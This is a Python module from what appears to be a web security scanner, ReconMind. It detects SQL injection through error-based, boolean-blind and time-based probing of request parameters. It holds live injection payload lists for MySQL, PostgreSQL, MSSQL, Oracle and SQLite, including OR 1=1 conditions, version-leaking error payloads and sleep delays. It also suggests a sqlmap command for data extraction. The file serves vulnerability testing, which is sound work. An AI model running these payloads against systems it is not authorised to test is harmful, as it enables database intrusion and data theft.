"""
modules/sqli/sqli_validator.py
================================
SQL Injection detection engine for ReconMind Phase 3 by wamiqsec.

ARCHITECTURE:
────────────────────────────────────────────────────────────────
Three independent detection techniques. All three feed into the
confidence engine. A finding is only reported when enough signals
agree — not when any single technique fires.

TECHNIQUE 1: Error-Based Detection
    Inject syntax errors and look for SPECIFIC database error strings.
    Not just "response changed" — SPECIFIC error patterns per database.
    Confidence: 0.90 (very reliable — false positives are rare)

TECHNIQUE 2: Boolean-Based Blind Detection
    Inject TRUE condition (id=1 AND 1=1) → compare with baseline
    Inject FALSE condition (id=1 AND 1=2) → should differ from baseline
    BOTH must hold consistently across 3 probes before reporting.
    Confidence: 0.70 per technique, 0.85 combined

TECHNIQUE 3: Time-Based Blind Detection
    Inject SLEEP(3) / WAITFOR DELAY → measure execution time.
    Uses statistical timing: 3 samples, median comparison.
    Same statistical rigor as the SSRF timing module.
    Confidence: 0.65 (timing is noisier than error/boolean)

SUPPORTED DATABASES:
    MySQL, PostgreSQL, MSSQL, Oracle, SQLite
"""

import time
import statistics
import re
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from core.recon.url_handler import URLTarget
from core.extractor.param_extractor import Parameter, ParamType
from core.utils.http_client import safe_get, safe_post
from core.intelligence.normalizer import normalize_response
from core.intelligence.similarity_engine import compute_similarity
from core.intelligence.confidence_engine import (
    create_bundle, mark_signal, calculate_confidence, EvidenceBundle,
)
from config.settings import CONFIG
from core.utils.logger import get_logger

log = get_logger(__name__)

TIMING_SAMPLES = 3
SLEEP_SECONDS = 5  # Delay to inject (must be distinctive above network noise)


# ─────────────────────────────────────────────────────────────────────────────
# Database error signatures
# ─────────────────────────────────────────────────────────────────────────────

DB_ERROR_SIGNATURES: Dict[str, List[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "mysql_fetch_array()",
        "mysql_num_rows()",
        "supplied argument is not a valid mysql",
        "unclosed quotation mark",
        "division by zero",
        "com.mysql.jdbc",
    ],
    "PostgreSQL": [
        "pg_query()",
        "pg_exec()",
        "error: unterminated quoted string",
        "error: syntax error at or near",
        "org.postgresql.util.psqlexception",
        "psycopg2",
        "unterminated dollar-quoted string",
    ],
    "MSSQL": [
        "microsoft sql native client",
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
        "unclosed quotation mark after the character string",
        "incorrect syntax near",
        "sqlexception",
        "[sql server]",
    ],
    "Oracle": [
        "ora-01756",
        "ora-00907",
        "ora-00933",
        "quoted string not properly terminated",
        "oracle error",
        "oci_parse()",
        "oracle.jdbc.driver",
    ],
    "SQLite": [
        "sqlite3.operationalerror",
        "sqlite_master",
        "syntax error near",
        "unrecognized token",
    ],
    "Generic": [
        "sql syntax",
        "syntax error",
        "database error",
        "db error",
        "query failed",
        "invalid sql",
        "sql command not properly ended",
    ],
}

# Compile all patterns for fast matching
COMPILED_ERROR_PATTERNS: List[Tuple[str, re.Pattern]] = []
for db_name, patterns in DB_ERROR_SIGNATURES.items():
    for pattern_str in patterns:
        COMPILED_ERROR_PATTERNS.append(
            (db_name, re.compile(re.escape(pattern_str), re.IGNORECASE))
        )


# ─────────────────────────────────────────────────────────────────────────────
# Payload libraries by technique
# ─────────────────────────────────────────────────────────────────────────────

# Error-triggering payloads
ERROR_PAYLOADS = [
    "'",                    # Single quote — most common
    '"',                    # Double quote
    "';",                   # Quote + semicolon
    "' OR '1'='1",          # Classic OR injection
    "1'",                   # Numeric with quote
    "1\"",                  # Numeric with double quote
    "\\",                   # Backslash
    "1 AND 1=CONVERT(int, (SELECT @@version))",  # MSSQL specific
    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))-- -",  # MySQL error-based
]

# Boolean condition pairs (TRUE_payload, FALSE_payload)
BOOLEAN_PAYLOAD_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1 AND 'a'='a", "1 AND 'a'='b"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("1' AND '1'='1' --", "1' AND '1'='2' --"),
]

# Time-delay payloads by database
TIME_PAYLOADS: Dict[str, str] = {
    "MySQL":      f"1 AND SLEEP({SLEEP_SECONDS})",
    "PostgreSQL": f"1; SELECT pg_sleep({SLEEP_SECONDS}); --",
    "MSSQL":      f"1; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'; --",
    "Oracle":     f"1 AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP_SECONDS}))",
    "Generic":    f"1 AND SLEEP({SLEEP_SECONDS})",
}


@dataclass
class SQLiResult:
    """SQL injection finding with full evidence chain."""
    url: str
    parameter: str
    param_type: str
    detected_database: str = "Unknown"
    techniques_confirmed: List[str] = field(default_factory=list)
    bundle: Optional[EvidenceBundle] = None
    confidence: float = 0.0
    severity: str = "INFO"
    suppressed: bool = True
    evidence: str = ""
    notes: List[str] = field(default_factory=list)
    payload_used: str = ""


# ─────────────────────────────────────────────────────────────────────────────
# Helper functions
# ─────────────────────────────────────────────────────────────────────────────

def _build_probe_url(target: URLTarget, param: Parameter, value: str) -> str:
    parsed = urlparse(target.normalized)
    qp = parse_qs(parsed.query, keep_blank_values=True)
    qp[param.name] = [value]
    return urlunparse(parsed._replace(query=urlencode({k: v[0] for k, v in qp.items()})))


def _fetch(target: URLTarget, param: Parameter, value: str):
    """Fetch with param set to value. Returns (response, url)."""
    if param.param_type == ParamType.GET:
        url = _build_probe_url(target, param, value)
        return safe_get(url, allow_redirects=False), url
    else:
        post_url = param.form_action or target.base_url()
        return safe_post(post_url, data={param.name: value}, allow_redirects=False), post_url


def _timed_fetch(target: URLTarget, param: Parameter, value: str) -> Tuple[float, Optional[object]]:
    """Timed fetch returning (elapsed_seconds, response)."""
    start = time.perf_counter()
    response, _ = _fetch(target, param, value)
    return time.perf_counter() - start, response


# ─────────────────────────────────────────────────────────────────────────────
# Technique 1: Error-based detection
# ─────────────────────────────────────────────────────────────────────────────

def _check_error_based(
    target: URLTarget,
    param: Parameter,
    bundle: EvidenceBundle,
) -> Tuple[bool, str, str]:
    """
    Test for SQL error strings in response.

    Returns:
        (found: bool, database_name: str, evidence: str)
    """
    for payload in ERROR_PAYLOADS:
        # Inject into the parameter
        test_value = param.value + payload

        response, _ = _fetch(target, param, test_value)
        time.sleep(0.2)

        if response is None:
            continue

        response_lower = response.text.lower()

        for db_name, pattern in COMPILED_ERROR_PATTERNS:
            match = pattern.search(response_lower)
            if match:
                # Get context around the error
                idx = response_lower.find(match.group(0))
                start = max(0, idx - 20)
                end = min(len(response_lower), idx + len(match.group(0)) + 80)
                snippet = response.text[start:end].replace("\n", " ")

                log.info(
                    "  [SQLi ERROR-BASED] param=%r db=%s payload=%r",
                    param.name, db_name, payload[:40],
                )
                return True, db_name, f"[{db_name}] {match.group(0)}: ...{snippet}..."

    return False, "Unknown", ""


# ─────────────────────────────────────────────────────────────────────────────
# Technique 2: Boolean-based blind detection
# ─────────────────────────────────────────────────────────────────────────────

def _check_boolean_based(
    target: URLTarget,
    param: Parameter,
) -> Tuple[bool, str]:
    """
    Test boolean blind injection.

    For each payload pair (TRUE, FALSE):
        TRUE probe must be similar to baseline.
        FALSE probe must differ from baseline.
        Both must hold consistently.

    Returns:
        (confirmed: bool, evidence: str)
    """
    # Fetch fresh baseline
    baseline_response, _ = _fetch(target, param, param.value)
    if baseline_response is None:
        return False, ""
    baseline_nr = normalize_response(baseline_response.text)
    time.sleep(0.3)

    confirmed_pairs = 0
    evidence_parts = []

    for true_suffix, false_suffix in BOOLEAN_PAYLOAD_PAIRS[:3]:  # Test 3 pairs
        true_value = f"{param.value} {true_suffix}"
        false_value = f"{param.value} {false_suffix}"

        # TRUE probe — should match baseline
        true_response, _ = _fetch(target, param, true_value)
        time.sleep(0.2)

        if true_response is None:
            continue

        # FALSE probe — should differ from baseline
        false_response, _ = _fetch(target, param, false_value)
        time.sleep(0.2)

        if false_response is None:
            continue

        true_nr = normalize_response(true_response.text)
        false_nr = normalize_response(false_response.text)

        true_sim = compute_similarity(baseline_nr, true_nr, context="SQLI")
        false_sim = compute_similarity(baseline_nr, false_nr, context="SQLI")

        true_matches_baseline = true_sim.composite_similarity >= 0.85
        false_differs_from_baseline = false_sim.composite_similarity < 0.40

        if true_matches_baseline and false_differs_from_baseline:
            confirmed_pairs += 1
            evidence_parts.append(
                f"TRUE({true_suffix}): sim={true_sim.composite_similarity:.0%} ✓  "
                f"FALSE({false_suffix}): sim={false_sim.composite_similarity:.0%} ✓"
            )
            log.debug(
                "  Boolean pair confirmed: TRUE_sim=%.2f FALSE_sim=%.2f",
                true_sim.composite_similarity, false_sim.composite_similarity,
            )
        else:
            log.debug(
                "  Boolean pair NOT confirmed: TRUE_sim=%.2f FALSE_sim=%.2f",
                true_sim.composite_similarity, false_sim.composite_similarity,
            )

    # Need at least 2 of 3 pairs to confirm
    if confirmed_pairs >= 2:
        return True, " | ".join(evidence_parts)

    return False, ""


# ─────────────────────────────────────────────────────────────────────────────
# Technique 3: Time-based blind detection
# ─────────────────────────────────────────────────────────────────────────────

def _check_time_based(
    target: URLTarget,
    param: Parameter,
) -> Tuple[bool, str, float]:
    """
    Test time-based blind injection using statistical timing.

    Returns:
        (confirmed: bool, evidence: str, confidence: float)
    """
    # Baseline: 3 samples
    baseline_times = []
    for _ in range(TIMING_SAMPLES):
        elapsed, _ = _timed_fetch(target, param, param.value)
        baseline_times.append(elapsed)
        time.sleep(0.3)

    baseline_median = statistics.median(baseline_times)
    baseline_stddev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0.5

    # Probe: try each database's time payload
    for db_name, time_payload in TIME_PAYLOADS.items():
        test_value = f"{param.value} {time_payload}"
        probe_times = []

        for _ in range(TIMING_SAMPLES):
            elapsed, _ = _timed_fetch(target, param, test_value)
            probe_times.append(elapsed)
            time.sleep(0.3)

        probe_median = statistics.median(probe_times)
        probe_stddev = statistics.stdev(probe_times) if len(probe_times) > 1 else 0.0

        # Statistical threshold
        threshold = baseline_median + max(SLEEP_SECONDS * 0.7, 3 * baseline_stddev)
        is_consistent = probe_stddev < 2.0

        if probe_median >= threshold and is_consistent:
            evidence = (
                f"[{db_name}] baseline={baseline_median:.2f}s "
                f"probe={probe_median:.2f}s (delay={probe_median-baseline_median:.2f}s) "
                f"threshold={threshold:.2f}s payload={time_payload[:40]}"
            )
            confidence = 0.65 if probe_median >= SLEEP_SECONDS else 0.45

            log.info(
                "  [SQLi TIME-BASED] param=%r db=%s delay=%.2fs confidence=%.0f%%",
                param.name, db_name,
                probe_median - baseline_median,
                confidence * 100,
            )
            return True, evidence, confidence

    return False, "", 0.0


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

def run_sqli_validation(target: URLTarget) -> List[SQLiResult]:
    """
    Run SQL injection validation using three-technique pipeline.

    Args:
        target: URLTarget with .parameters populated by Phase 1.

    Returns:
        List of SQLiResult objects.
    """
    parameters: List[Parameter] = getattr(target, "parameters", [])

    if not parameters:
        return []

    # Test all parameters — SQLi can appear in any parameter type
    log.info(
        "SQLi validation: %s — %d parameter(s)",
        target.normalized, len(parameters),
    )

    all_results: List[SQLiResult] = []

    for param in parameters:
        # Skip purely numeric values without quotes — less likely to be injectable
        # (but don't skip completely — numeric SQLi exists)
        log.debug("  SQLi testing: param=%r value=%r", param.name, param.value)

        bundle = create_bundle(
            module="SQLI",
            url=target.normalized,
            parameter=param.name,
            param_type=param.param_type,
        )

        detected_db = "Unknown"
        techniques_confirmed = []

        # ── Technique 1: Error-based ──────────────────────────────────────
        error_found, db_name, error_evidence = _check_error_based(target, param, bundle)
        if error_found:
            detected_db = db_name
            techniques_confirmed.append("error-based")
            mark_signal(bundle, "db_error_string_detected", error_evidence)
            if db_name != "Generic" and db_name != "Unknown":
                mark_signal(bundle, "db_fingerprinted", f"Database identified: {db_name}")

        # ── Technique 2: Boolean-based ────────────────────────────────────
        bool_confirmed, bool_evidence = _check_boolean_based(target, param)
        if bool_confirmed:
            techniques_confirmed.append("boolean-based")
            mark_signal(bundle, "boolean_true_matches_baseline",
                        "TRUE condition response matches baseline")
            mark_signal(bundle, "boolean_false_differs_from_baseline",
                        f"FALSE condition differs: {bool_evidence}")

        # ── Technique 3: Time-based ───────────────────────────────────────
        # Only run if error/boolean didn't confirm (timing is slower)
        if not techniques_confirmed:
            time_confirmed, time_evidence, time_confidence = _check_time_based(
                target, param
            )
            if time_confirmed:
                techniques_confirmed.append("time-based")
                mark_signal(bundle, "time_delay_consistent", time_evidence)

        # ── Calculate confidence ──────────────────────────────────────────
        bundle = calculate_confidence(bundle)

        if not techniques_confirmed:
            log.debug("  No SQLi signals for param=%r — skipping", param.name)
            continue

        result = SQLiResult(
            url=target.normalized,
            parameter=param.name,
            param_type=param.param_type,
            detected_database=detected_db,
            techniques_confirmed=techniques_confirmed,
            bundle=bundle,
            confidence=bundle.combined_confidence,
            severity=bundle.severity,
            suppressed=bundle.suppressed,
            evidence="\n".join(bundle.full_evidence),
        )

        if not bundle.suppressed:
            result.notes.append(
                f"SQLi confirmed via: {', '.join(techniques_confirmed)}"
            )
            result.notes.append(
                f"Database: {detected_db} — use sqlmap for data extraction"
            )
            result.notes.append(
                "sqlmap -u '<url>' -p <param> --dbms=" + detected_db.lower()
            )
        else:
            result.notes.append(
                f"Confidence {bundle.combined_confidence:.0%} below threshold — "
                "manual verification recommended"
            )

        all_results.append(result)

        log.info(
            "  SQLi result: param=%r db=%s techniques=%s confidence=%.0f%% suppressed=%s",
            param.name, detected_db, techniques_confirmed,
            bundle.combined_confidence * 100, bundle.suppressed,
        )

    setattr(target, "sqli_results", all_results)
    return all_results
